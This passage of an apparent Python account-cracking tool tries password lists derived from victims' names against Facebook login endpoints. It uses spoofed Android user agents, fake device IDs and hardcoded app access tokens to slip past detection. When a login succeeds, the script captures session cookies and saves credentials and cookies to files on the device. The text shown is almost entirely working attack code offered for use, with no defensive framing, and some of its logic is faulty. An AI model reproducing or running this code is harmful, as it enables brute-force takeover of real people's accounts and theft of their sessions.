Safari/534.9','Mozilla/5.0 (Linux; U; Android 5.0; SM-T815 Build/LRX22G) AppleWebKit/603.38 (KHTML, like Gecko)  Chrome/49.0.2974.184 Mobile Safari/535.1','Mozilla/5.0 (Linux; U; Android 4.4; [HM NOTE|NOTE-III|NOTE2 1LTETD) AppleWebKit/603.1 (KHTML, like Gecko)  Chrome/55.0.2124.388 Mobile Safari/537.9','Mozilla/5.0 (Android; Android 5.0; LG-D707 Build/LRX22G) AppleWebKit/534.23 (KHTML, like Gecko)  Chrome/52.0.1989.353 Mobile Safari/536.8','Mozilla/5.0 (Linux; Android 5.1; MOTO G Build/LPD23) AppleWebKit/600.4 (KHTML, like Gecko)  Chrome/47.0.3252.139 Mobile Safari/535.6','Mozilla/5.0 (Linux; U; Android 4.4.4; SM-N9008 Build/KOT49H) AppleWebKit/534.22 (KHTML, like Gecko)  Chrome/49.0.2297.157 Mobile Safari/533.2','Mozilla/5.0 (Linux; Android 5.0; LG-D325 Build/LRX22G) AppleWebKit/603.28 (KHTML, like Gecko)  Chrome/48.0.1318.224 Mobile Safari/600.8','Mozilla/5.0 (Android; Android 7.1; GT-I9300 Build/KTU84P) AppleWebKit/600.39 (KHTML, like Gecko)  Chrome/55.0.3848.280 Mobile Safari/600.9','Mozilla/5.0 (Android; Android 5.0.2; SAMSUNG-SM-N915F Build/LRX22C) AppleWebKit/536.25 (KHTML, like Gecko)  Chrome/49.0.3082.226 Mobile Safari/602.2','Mozilla/5.0 (Linux; Android 7.1.1; Pixel XL Build/NRD90M) AppleWebKit/602.11 (KHTML, like Gecko)  Chrome/55.0.3078.102 Mobile Safari/534.5Mozilla/5.0 (Linux; Android 4.3.1; Samsung Galaxy S4 Mega GT-I9100 Build/JDQ39) AppleWebKit/537.47 (KHTML, like Gecko)  Chrome/55.0.2519.276 Mobile Safari/533.2','Mozilla/5.0 (Linux; U; Android 7.1; LG-H930 Build/NRD90M) AppleWebKit/536.25 (KHTML, like Gecko)  Chrome/55.0.2095.142 Mobile Safari/601.4','Mozilla/5.0 (Linux; U; Android 7.0; Xperia Build/NDE63X) AppleWebKit/600.30 (KHTML, like Gecko)  Chrome/51.0.3430.113 Mobile Safari/537.7','Mozilla/5.0 (Android; Android 4.4; HTC One_M9 Build/KTU84L) AppleWebKit/533.19 (KHTML, like Gecko)  Chrome/51.0.2068.113 Mobile Safari/602.2','Mozilla/5.0 (Android; Android 7.1.1; Nexus 9 Build/NME91E) AppleWebKit/534.18 (KHTML, like Gecko)  Chrome/55.0.3107.184 Mobile Safari/534.4','Mozilla/5.0 (Linux; U; Android 5.0.1; HTC [M8|M9|M8 Pro Build/LRX22G) AppleWebKit/535.10 (KHTML, like Gecko)  Chrome/55.0.3562.367 Mobile Safari/533.9','Mozilla/5.0 (Android; Android 4.3.1; SM-G350V Build/JLS36C) AppleWebKit/537.13 (KHTML, like Gecko)  Chrome/52.0.1635.166 Mobile Safari/533.7','Mozilla/5.0 (Linux; U; Android 5.0; SAMSUNG SM-T800 Build/LRX22G) AppleWebKit/601.20 (KHTML, like Gecko)  Chrome/52.0.2392.375 Mobile Safari/603.9','Mozilla/5.0 (Android; Android 5.0.1; HTC Butterfly S 901 Build/LRX22G) AppleWebKit/533.17 (KHTML, like Gecko)  Chrome/55.0.1715.201 Mobile Safari/603.0','Mozilla/5.0 (Linux; Android 5.0.1; LG-D329 Build/LRX22G) AppleWebKit/537.37 (KHTML, like Gecko)  Chrome/54.0.2695.379 Mobile Safari/600.0','Mozilla/5.0 (Linux; U; Android 5.1.1; SAMSUNG SM-G9350L Build/LMY47X) AppleWebKit/602.13 (KHTML, like Gecko)  Chrome/54.0.1854.147 Mobile Safari/534.3','Mozilla/5.0 (Android; Android 5.0; SAMSUNG SM-T805 Build/LRX22G) AppleWebKit/536.16 (KHTML, like Gecko)  Chrome/49.0.2037.254 Mobile Safari/535.8','Mozilla/5.0 (Linux; U; Android 4.4.1; LG-D470 Build/KOT49I) AppleWebKit/600.24 (KHTML, like Gecko)  Chrome/49.0.1559.127 Mobile Safari/602.9','Mozilla/5.0 (Linux; U; Android 4.4.4; SAMSUNG SM-J100G Build/KTU84P) AppleWebKit/536.42 (KHTML, like Gecko)  Chrome/48.0.1081.174 Mobile Safari/600.9','Mozilla/5.0 (Android; Android 6.0.1; Nexus 6X Build/MDB08L) AppleWebKit/533.2 (KHTML, like Gecko)  Chrome/54.0.2809.359 Mobile Safari/536.3','Mozilla/5.0 (Linux; Android 6.0; Nexus 6 Build/MMB29V) AppleWebKit/601.8 (KHTML, like Gecko)  Chrome/55.0.1211.230 Mobile Safari/600.4','Mozilla/5.0 (Linux; U; Android 4.4; SAMSUNG SM-E500F Build/KTU84P) AppleWebKit/537.40 (KHTML, like Gecko)  Chrome/54.0.2476.336 Mobile Safari/537.1','Mozilla/5.0 (Linux; U; Android 4.3.1; Nokia 3310 Build/IMM76D) AppleWebKit/533.49 (KHTML, like Gecko)  Chrome/51.0.1844.294 Mobile Safari/603.2','Mozilla/5.0 (Linux; U; Android 5.0.2; SAMSUNG-SM-N915FY Build/LRX22C) AppleWebKit/533.16 (KHTML, like Gecko)  Chrome/54.0.2341.124 Mobile Safari/602.6','Mozilla/5.0 (Android; Android 5.1; SAMSUNG SM-G9358 Build/LMY47X) AppleWebKit/600.22 (KHTML, like Gecko)  Chrome/52.0.2619.266 Mobile Safari/536.3','Mozilla/5.0 (Android; Android 5.1.1; SM-G920F-ORANGE Build/LMY47X) AppleWebKit/600.32 (KHTML, like Gecko)  Chrome/48.0.3651.378 Mobile Safari/537.1','Mozilla/5.0 (Linux; U; Android 5.0.1; SAMSUNG SM-A700F Build/LMY47X) AppleWebKit/536.6 (KHTML, like Gecko)  Chrome/51.0.3595.208 Mobile Safari/600.6','Mozilla/5.0 (Linux; U; Android 7.0; Pixel XL Build/NME91E) AppleWebKit/601.6 (KHTML, like Gecko)  Chrome/53.0.2236.141 Mobile Safari/537.2','Mozilla/5.0 (Android; Android 5.0.2; SM-P550 Build/LRX22G) AppleWebKit/601.44 (KHTML, like Gecko)  Chrome/54.0.1590.322 Mobile Safari/602.6','Mozilla/5.0 (Android; Android 7.1.1; LG-H900 Build/NRD90M) AppleWebKit/603.8 (KHTML, like Gecko)  Chrome/55.0.3714.296 Mobile Safari/533.4','Mozilla/5.0 (Linux; U; Android 7.0; LG-H920 Build/NRD90M) AppleWebKit/603.44 (KHTML, like Gecko)  Chrome/48.0.1661.317 Mobile Safari/536.7','Mozilla/5.0 (Android; Android 5.0.2; LG-D721 Build/LRX22G) AppleWebKit/603.18 (KHTML, like Gecko)  Chrome/49.0.1072.135 Mobile Safari/601.3','Mozilla/5.0 (Android; Android 7.1; Pixel C Build/NRD90M) AppleWebKit/600.10 (KHTML, like Gecko)  Chrome/50.0.1022.234 Mobile Safari/602.0','Mozilla/5.0 (Linux; Android 6.0.1; HTC One M9 Build/MRA58K) AppleWebKit/535.29 (KHTML, like Gecko)  Chrome/48.0.3087.387 Mobile Safari/535.6','Mozilla/5.0 (Android; Android 5.1; Nexus 6 Build/LMY48B) AppleWebKit/533.50 (KHTML, like Gecko)  Chrome/48.0.3216.277 Mobile Safari/533.5','Mozilla/5.0 (Linux; U; Android 5.0.1; SAMSUNG SM-G9008 Build/KTU84F) AppleWebKit/603.46 (KHTML, like Gecko)  Chrome/52.0.2000.352 Mobile Safari/535.1','Mozilla/5.0 (Linux; U; Android 4.4.1; Elephone P6000 Build/KTU84P) AppleWebKit/537.21 (KHTML, like Gecko)  Chrome/54.0.1268.206 Mobile Safari/534.5','Mozilla/5.0 (Linux; Android 6.0; SAMSUNG SM-D9288 Build/MDB08I) AppleWebKit/533.3 (KHTML, like Gecko)  Chrome/53.0.2233.295 Mobile Safari/537.4','Mozilla/5.0 (Android; Android 5.0.1; SM-P550 Build/LRX22G) AppleWebKit/603.33 (KHTML, like Gecko)  Chrome/49.0.2381.330 Mobile Safari/601.8','Mozilla/5.0 (Linux; Android 4.4.1; XT1019 Build/[KXB20.9|KXC21.5]) AppleWebKit/535.43 (KHTML, like Gecko)  Chrome/52.0.2381.169 Mobile Safari/602.3','Mozilla/5.0 (Linux; U; Android 4.3.1; SAMSUNG SM-T255s Build/JSS15J) AppleWebKit/534.16 (KHTML, like Gecko)  Chrome/48.0.3984.232 Mobile Safari/535.5','Mozilla/5.0 (Linux; Android 4.3.1; Ascend G330 Build/JLS36I) AppleWebKit/601.50 (KHTML, like Gecko)  Chrome/48.0.3032.154 Mobile Safari/535.7','Mozilla/5.0 (Linux; U; Android 5.1; SM-G935FD Build/LMY47X) AppleWebKit/600.15 (KHTML, like Gecko)  Chrome/52.0.3560.217 Mobile Safari/600.6','Mozilla/5.0 (Linux; U; Android 5.0.2; SAMSUNG-SM-N910A Build/LRX22C) AppleWebKit/600.22 (KHTML, like Gecko)  Chrome/49.0.1571.375 Mobile Safari/535.5','Mozilla/5.0 (Linux; U; Android 5.0.1; LG-G839T Build/KOT49I) AppleWebKit/536.27 (KHTML, like Gecko)  Chrome/49.0.1398.145 Mobile Safari/601.5','Mozilla/5.0 (Linux; Android 4.3.1; Ascend G300 Build/JLS36I) AppleWebKit/537.41 (KHTML, like Gecko)  Chrome/55.0.2629.172 Mobile Safari/536.1','Mozilla/5.0 (Android; Android 7.1; Nexus 5X Build/NPD90G) AppleWebKit/601.29 (KHTML, like Gecko)  Chrome/50.0.1337.191 Mobile Safari/601.6','Mozilla/5.0 (Linux; U; Android 5.0; HTC [M8|M9|M8 Pro Build/LRX22G) AppleWebKit/536.19 (KHTML, like Gecko)  Chrome/51.0.3810.121 Mobile Safari/537.1','Mozilla/5.0 (Android; Android 6.0; HTC One0P6B Build/MRA58K) AppleWebKit/600.18 (KHTML, like Gecko)  Chrome/48.0.2526.329 Mobile Safari/533.3','Mozilla/5.0 (Android; Android 4.4.4; Nexus5 V7.1 Build/KOT49H) AppleWebKit/600.14 (KHTML, like Gecko)  Chrome/53.0.1895.287 Mobile Safari/602.4','Mozilla/5.0 (Linux; U; Android 5.0.2; LG-D728 Build/LRX22G) AppleWebKit/535.50 (KHTML, like Gecko)  Chrome/49.0.1031.189 Mobile Safari/600.6','Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG-SM-N915A Build/LRX22C) AppleWebKit/603.18 (KHTML, like Gecko)  Chrome/50.0.1072.349 Mobile Safari/535.2','Mozilla/5.0 (Linux; U; Android 5.1.1; Nexus 5 Build/LRX22C) AppleWebKit/535.16 (KHTML, like Gecko)  Chrome/51.0.1759.211 Mobile Safari/601.4','Mozilla/5.0 (Android; Android 7.0; Nexus 9 Build/NPD90G) AppleWebKit/536.27 (KHTML, like Gecko)  Chrome/47.0.3802.380 Mobile Safari/537.7','Mozilla/5.0 (Linux; U; Android 4.4; LG Optimus G Build/KRT16M) AppleWebKit/602.40 (KHTML, like Gecko)  Chrome/53.0.2136.107 Mobile Safari/534.9','Mozilla/5.0 (Android; Android 5.0; Nokia 1000 wifi Build/GRK39F) AppleWebKit/535.34 (KHTML, like Gecko)  Chrome/55.0.1140.285 Mobile Safari/535.8','Mozilla/5.0 (Linux; U; Android 5.0.1; SM-N915V Build/LRX22C) AppleWebKit/601.15 (KHTML, like Gecko)  Chrome/51.0.2335.291 Mobile Safari/603.5','Mozilla/5.0 (Android; Android 5.0; SM-N915G Build/LRX22C) AppleWebKit/602.44 (KHTML, like Gecko)  Chrome/54.0.1988.297 Mobile Safari/537.6','Mozilla/5.0 (Android; Android 7.1.1; Nexus 6X Build/NME91E) AppleWebKit/534.25 (KHTML, like Gecko)  Chrome/53.0.2916.266 Mobile Safari/603.2','Mozilla/5.0 (Android; Android 5.1; Nexus 9 Build/LRX22C) AppleWebKit/533.29 (KHTML, like Gecko)  Chrome/47.0.1513.324 Mobile Safari/600.0','Mozilla/5.0 (Android; Android 5.0; Nokia 1100 wifi Build/GRK39F) AppleWebKit/535.23 (KHTML, like Gecko)  Chrome/52.0.3465.248 Mobile Safari/603.3','Mozilla/5.0 (Linux; Android 4.4.4; Nexus5 V6.1 Build/KOT49H) AppleWebKit/537.3 (KHTML, like Gecko)  Chrome/53.0.2333.315 Mobile Safari/537.7','Mozilla/5.0 (Linux; U; Android 4.3.1; HTC One 801s Build/JSS15J) AppleWebKit/535.1 (KHTML, like Gecko)  Chrome/48.0.2317.315 Mobile Safari/603.6','Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LRX22C) AppleWebKit/600.40 (KHTML, like Gecko)  Chrome/47.0.1194.275 Mobile Safari/533.8','Mozilla/5.0 (Linux; Android 5.1; MOTOROLA MOTO XT1570 MOTO X STYLE Build/LPH223) AppleWebKit/601.30 (KHTML, like Gecko)  Chrome/51.0.3420.282 Mobile Safari/600.1','Mozilla/5.0 (Android; Android 7.1.1; SAMSUNG GT-I9300 Build/KTU84P) AppleWebKit/536.17 (KHTML, like Gecko)  Chrome/52.0.3825.121 Mobile Safari/601.9','Mozilla/5.0 (Linux; Android 5.1; MOTOROLA MOTO XT1580 Build/LPK23) AppleWebKit/536.32 (KHTML, like Gecko)  Chrome/54.0.1048.247 Mobile Safari/602.4','Mozilla/5.0 (Linux; U; Android 7.1; Nexus 7P Build/NME91E) AppleWebKit/601.44 (KHTML, like Gecko)  Chrome/51.0.2683.146 Mobile Safari/602.9','Mozilla/5.0 (Linux; U; Android 7.1.1; LG-H900 Build/NRD90C) AppleWebKit/535.22 (KHTML, like Gecko)  Chrome/50.0.1162.301 Mobile Safari/602.0','Mozilla/5.0 (Android; Android 6.0; Nexus 7 Build/MDB08I) AppleWebKit/535.38 (KHTML, like Gecko)  Chrome/50.0.3882.265 Mobile Safari/602.9','Mozilla/5.0 (Android; Android 4.4.1; E:number:20-23:01 Build/24.0.B.1.34) AppleWebKit/536.25 (KHTML, like Gecko)  Chrome/55.0.1040.349 Mobile Safari/537.7','Mozilla/5.0 (Android; Android 7.1; Nexus 9X Build/NPD90G) AppleWebKit/537.14 (KHTML, like Gecko)  Chrome/55.0.1777.272 Mobile Safari/600.4'])
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": ids,
"password": pas,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d",}
                        headers={
                                'User-Agent': ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '25227',
'X-FB-SIM-HNI': '29752',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Content-Length': '706'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;34m [NOYON-OK] \033[1;32m'+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;34m COOKIE: \033[1;32m"+coki)
                                        open('/sdcard/NOYON-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/NOYON-OK-M1.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[NOYON-2F] \033[1;32m'+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/NOYON-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/NOYON-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
def api6(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [TRT-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Khan'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			ua=random.choice(ugen)
			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			TRT=session.cookies.get_dict().keys()
			if "c_user" in TRT:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [TRT-OK] %s | %s'%(ids,pas))
				open('/sdcard/TRT-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in TRT:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/TRT-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1
#method6
#d.fb
def api7(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [TRT-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Khan'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			ua=random.choice(ugen)
			head = {'Host': 'd.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
			getlog = session.get(f'https://d.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://d.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			TRT=session.cookies.get_dict().keys()
			if "c_user" in TRT:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [TRT-OK] %s | %s'%(ids,pas))
				open('/sdcard/TRT-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in TRT:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/TRT-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1
#method7
def api8(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [TRT-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Khan'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			ua=random.choice(ugen)
			head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
			getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			TRT=session.cookies.get_dict().keys()
			if "c_user" in TRT:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [TRT-OK] %s | %s'%(ids,pas))
				open('/sdcard/TRT-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in TRT:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/TRT-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1
#method1rnd
def trt1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [TRT-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.1.0; '+model+' Build/'+build+') [FBAN/FB4A;FBAV/37.0.0.0.109;FBBV/11557663;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Android;FBMF/unknown;FBBD/generic;FBPN/com.facebook.katana;FBDV/google_sdk;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": ids,
"password": pas,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d",}
                        headers={
                                'User-Agent': ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '45204',
'X-FB-SIM-HNI': '45201',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Content-Length': '698'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [TRT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TRT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[38;5;205m [TRT-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TRT-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass

def trt2(ids,passlist):
	global loop
	global oks
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;37m [TRT-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
			application_version_code=str(random.randint(000000000,999999999))
			__iam_genius = random.choice(android_models)
			phone_model = __iam_genius.split('|')[0]
			phone_company = __iam_genius.split('|')[1]
			dimensions = __iam_genius.split('|')[2]
			ffb=random.choice(fbks)
